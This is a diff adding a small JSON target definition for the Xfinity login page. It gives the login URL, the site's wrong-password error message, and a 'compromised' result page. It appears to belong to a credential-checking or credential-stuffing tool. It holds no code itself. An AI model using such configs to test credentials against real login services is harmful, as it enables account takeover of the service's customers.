@@ -1,0 +1,6 @@
+
+{
+    "url" : "https://login.xfinity.com/login",
+    "on_error_text" : "The Xfinity ID or password you entered was incorrect. Please try again.",
+    "compromised": "compromised_uid.html"
+} 
